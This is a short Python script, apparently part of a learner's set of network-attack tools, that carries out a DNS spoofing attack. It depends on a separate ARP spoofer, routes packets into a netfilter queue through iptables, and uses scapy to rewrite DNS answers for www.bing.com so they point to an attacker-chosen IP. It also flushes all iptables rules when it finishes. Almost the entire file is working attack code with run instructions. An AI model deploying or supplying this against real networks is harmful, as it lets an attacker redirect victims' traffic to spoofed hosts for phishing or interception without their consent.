#this program requires you to run my arp_spoofer.py first
#the following is written to work in our own system with virtual machines, It will still work for other system

import subprocess
#pip install netfilterqueue
import netfilterqueue
import scapy.all as scapy

def linux_commands_start():
	subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num0", shell=True)
	subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num0", shell=True)
	#to test on your another computer change the above command two command with a single "iptables -I FORWARD -j NFQUEUE --queue-num0" command

def linux_commands_end():
	subprocess.call("iptables --flush", shell=True)

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in qname:
			print("Starting our spoofing attack:")
			answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.1") #rdata is the field of the spoofed IP you want the user to be redirected to
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(str(scapy_packet))

	packet.accept() #reffer net_cut.py for more details

linux_commands_start()

queue= netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

linux_commands_end()